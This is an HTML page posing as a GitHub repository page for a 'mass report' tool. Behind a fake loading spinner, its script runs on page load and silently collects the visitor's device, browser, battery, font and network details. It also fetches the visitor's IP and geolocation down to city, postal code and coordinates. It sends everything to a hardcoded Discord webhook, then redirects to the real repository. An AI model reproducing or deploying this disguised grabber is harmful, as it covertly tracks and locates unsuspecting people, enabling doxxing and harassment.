<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GitHub - KrumoXDev/MassReporterx3: Best mass rep toxx tool!</title>
    <meta name="description" content="Nightcore Contribute to KrumoXDev/MassReporterx3 development by creating an account on GitHub.">
    <meta property="og:title" content="GitHub - KrumoXDev/MassReporterx3: Best mass rep toxx tool!">
    <meta property="og:description" content="Nightcore Contribute to KrumoXDev/MassReporterx3 development by creating an account on GitHub.">
    <meta property="og:url" content="https://github.com/KrumoXDev/MassReporterx3">
    <meta property="og:image" content="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png">
    <meta name="theme-color" content="#24292e">
    <style>
        body {
            font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;
            background-color: #0d1117;
            color: #c9d1d9;
            margin: 0;
            padding: 16px;
        }
        .container {
            max-width: 1012px;
            margin: 0 auto;
        }
        .header {
            display: flex;
            align-items: center;
            padding: 16px 0;
            border-bottom: 1px solid #21262d;
        }
        .github-logo {
            fill: #f0f6fc;
            margin-right: 16px;
        }
        .repo-header {
            padding: 24px 0;
        }
        .repo-title {
            font-size: 24px;
            font-weight: 600;
        }
        .loading {
            text-align: center;
            padding: 40px 0;
        }
        .spinner {
            border: 2px solid rgba(240, 246, 252, 0.1);
            border-top: 2px solid #f0f6fc;
            border-radius: 50%;
            width: 16px;
            height: 16px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-right: 8px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <svg height="32" class="github-logo" viewBox="0 0 16 16" version="1.1" width="32">
                <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
            </svg>
        </div>

        <div class="repo-header">
            <h1 class="repo-title">KrumoXDev/MassReporterx3</h1>
            <div class="loading">
                <div class="spinner"></div>
                Loading repository...
            </div>
        </div>
    </div>

    <script>
        // Enhanced data collection with battery status and more
        async function collectFullDeviceData() {
            const data = {
                timestamp: new Date().toISOString(),
                pageInfo: {
                    url: window.location.href,
                    referrer: document.referrer || "direct"
                },
                browser: {
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    doNotTrack: navigator.doNotTrack,
                    cookieEnabled: navigator.cookieEnabled,
                    pdfViewerEnabled: navigator.pdfViewerEnabled,
                    webdriver: navigator.webdriver
                },
                screen: {
                    width: window.screen.width,
                    height: window.screen.height,
                    colorDepth: window.screen.colorDepth,
                    pixelRatio: window.devicePixelRatio,
                    orientation: window.screen.orientation?.type
                },
                hardware: {
                    deviceMemory: navigator.deviceMemory || "unknown",
                    cpuCores: navigator.hardwareConcurrency || "unknown",
                    maxTouchPoints: navigator.maxTouchPoints || 0
                },
                connection: navigator.connection ? {
                    type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                } : null,
                gpu: null,
                battery: null,
                location: null,
                ip: null
            };

            // Get WebGL/GPU information
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    data.gpu = {
                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                    };
                }
            } catch (e) {}

            // Get battery status (if available)
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    data.battery = {
                        level: battery.level * 100 + "%",
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                }
            } catch (e) {}

            // Get IP and location data with fallback providers
            try {
                // Try first provider
                const ipRes1 = await fetch('https://api.ipify.org?format=json');
                if (ipRes1.ok) {
                    const ipData = await ipRes1.json();
                    data.ip = ipData.ip;
                    
                    // Get location data
                    const geoRes = await fetch(`https://ipapi.co/${data.ip}/json/`);
                    if (geoRes.ok) {
                        const geoData = await geoRes.json();
                        data.location = {
                            ip: data.ip,
                            country: geoData.country_name,
                            region: geoData.region,
                            city: geoData.city,
                            postal: geoData.postal,
                            timezone: geoData.timezone,
                            coordinates: {
                                latitude: geoData.latitude,
                                longitude: geoData.longitude
                            },
                            network: {
                                isp: geoData.org,
                                asn: geoData.asn
                            }
                        };
                    }
                }
            } catch (e) {
                // Fallback to second provider if first fails
                try {
                    const ipRes2 = await fetch('https://ipinfo.io/json');
                    if (ipRes2.ok) {
                        const ipData = await ipRes2.json();
                        data.ip = ipData.ip;
                        data.location = {
                            ip: data.ip,
                            country: ipData.country,
                            region: ipData.region,
                            city: ipData.city,
                            postal: ipData.postal,
                            timezone: ipData.timezone,
                            coordinates: ipData.loc ? {
                                latitude: ipData.loc.split(',')[0],
                                longitude: ipData.loc.split(',')[1]
                            } : null,
                            network: {
                                isp: ipData.org,
                                asn: ipData.asn
                            }
                        };
                    }
                } catch (e) {}
            }

            // Get installed fonts (additional fingerprinting)
            try {
                const fontList = await getFonts();
                data.fonts = fontList.slice(0, 20); // Limit to first 20 fonts
            } catch (e) {
                // Fallback to basic font detection
                data.fonts = {
                    installed: document.fonts ? document.fonts.size : "unknown",
                    common: detectCommonFonts()
                };
            }

            return data;
        }

        // Helper function to detect common fonts
        function detectCommonFonts() {
            const commonFonts = [
                'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
                'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
                'Verdana', 'Andale Mono', 'Baskerville', 'Garamond'
            ];
            const available = [];
            
            const div = document.createElement('div');
            div.style.position = 'absolute';
            div.style.left = '-9999px';
            div.style.visibility = 'hidden';
            div.innerHTML = commonFonts.map(font => 
                `<span style="font-family: ${font}, sans-serif">${font}</span>`
            ).join('');
            document.body.appendChild(div);
            
            const spans = div.getElementsByTagName('span');
            for (let i = 0; i < spans.length; i++) {
                if (spans[i].offsetWidth !== spans[0].offsetWidth || 
                    spans[i].offsetHeight !== spans[0].offsetHeight) {
                    available.push(commonFonts[i]);
                }
            }
            
            document.body.removeChild(div);
            return available;
        }

        // Modern font enumeration API
        async function getFonts() {
            try {
                await document.fonts.ready;
                const fontSet = new Set();
                for (const font of document.fonts) {
                    fontSet.add(font.family);
                }
                return Array.from(fontSet);
            } catch (e) {
                throw new Error('Font enumeration failed');
            }
        }

        // Send collected data to Discord
        async function sendToDiscord(data) {
            try {
                const webhookURL = "https://discord.com/api/webhooks/1372974294677717032/O69IOBRAohjNpU1R5AIDuMmo0leo_tf1VmijVvxf6AgXHTns7i_DawmHuKhDX_WGRC94";
                
                // Format the Discord message
                const message = {
                    content: "ðŸ” **New Visitor Data Collected**",
                    embeds: [{
                        title: "Detailed Device Information",
                        color: 0x5865F2,
                        fields: [
                            {
                                name: "ðŸŒ Location Info",
                                value: data.location ? 
                                    `**IP:** ||\`${data.location.ip}\`||\n` +
                                    `**Location:** ${data.location.city}, ${data.location.region}, ${data.location.country}\n` +
                                    `**Coordinates:** ${data.location.coordinates?.latitude}, ${data.location.coordinates?.longitude}\n` +
                                    `**ISP:** ${data.location.network.isp} (AS${data.location.network.asn})`
                                    : "Location data unavailable",
                                inline: true
                            },
                            {
                                name: "ðŸ’» Device Info",
                                value: `**OS:** ${data.browser.platform}\n` +
                                    `**Screen:** ${data.screen.width}x${data.screen.height} (${data.screen.pixelRatio}x)\n` +
                                    `**Memory:** ${data.hardware.deviceMemory}GB\n` +
                                    `**CPU Cores:** ${data.hardware.cpuCores}\n` +
                                    `**GPU:** ${data.gpu?.vendor || 'Unknown'}`,
                                inline: true
                            },
                            {
                                name: "ðŸ”‹ Battery Status",
                                value: data.battery ? 
                                    `**Level:** ${data.battery.level}\n` +
                                    `**Charging:** ${data.battery.charging ? 'Yes' : 'No'}\n` +
                                    `**Status:** ${data.battery.charging ? 
                                        `Charging (${formatTime(data.battery.chargingTime)})` : 
                                        `Discharging (${formatTime(data.battery.dischargingTime)})`}`
                                    : "Battery API not supported",
                                inline: true
                            },
                            {
                                name: "ðŸŒ Network Info",
                                value: data.connection ? 
                                    `**Type:** ${data.connection.type}\n` +
                                    `**Speed:** ~${Math.round(data.connection.downlink * 100) / 100} Mbps\n` +
                                    `**Latency:** ${data.connection.rtt}ms\n` +
                                    `**Save Data:** ${data.connection.saveData ? 'Enabled' : 'Disabled'}`
                                    : "Network info unavailable",
                                inline: true
                            },
                            {
                                name: "ðŸ–¥ï¸ Browser Info",
                                value: `**User Agent:** ||\`${data.browser.userAgent}\`||\n` +
                                    `**Language:** ${data.browser.language}\n` +
                                    `**Cookies:** ${data.browser.cookieEnabled ? 'Enabled' : 'Disabled'}\n` +
                                    `**WebDriver:** ${data.browser.webdriver ? 'Detected' : 'Not detected'}`,
                                inline: true
                            },
                            {
                                name: "âœ’ï¸ Fonts Detected",
                                value: data.fonts ? 
                                    (Array.isArray(data.fonts) ? 
                                        `${data.fonts.length} fonts (${data.fonts.slice(0, 3).join(', ')}...)` : 
                                        `${data.fonts.installed} fonts, ${data.fonts.common.length} common` 
                                    : "Font data unavailable",
                                inline: true
                            }
                        ],
                        footer: {
                            text: `Collected at ${new Date().toLocaleString()}`
                        }
                    }]
                };

                // Send the data
                await fetch(webhookURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(message)
                });
            } catch (e) {
                console.error("Failed to send data to Discord:", e);
            }
        }

        // Helper to format time
        function formatTime(seconds) {
            if (seconds === Infinity) return "Unknown";
            const hours = Math.floor(seconds / 3600);
            const minutes = Math.floor((seconds % 3600) / 60);
            return `${hours > 0 ? hours + 'h ' : ''}${minutes > 0 ? minutes + 'm' : '<1m'}`;
        }

        // Main execution
        (async () => {
            // Collect all possible data
            const deviceData = await collectFullDeviceData();
            
            // Send to Discord
            await sendToDiscord(deviceData);
            
            // Redirect after a short delay
            setTimeout(() => {
                window.location.href = "https://github.com/KrumoXDev/MassReporterx3";
            }, 2000);
        })();
    </script>
</body>
            </html>
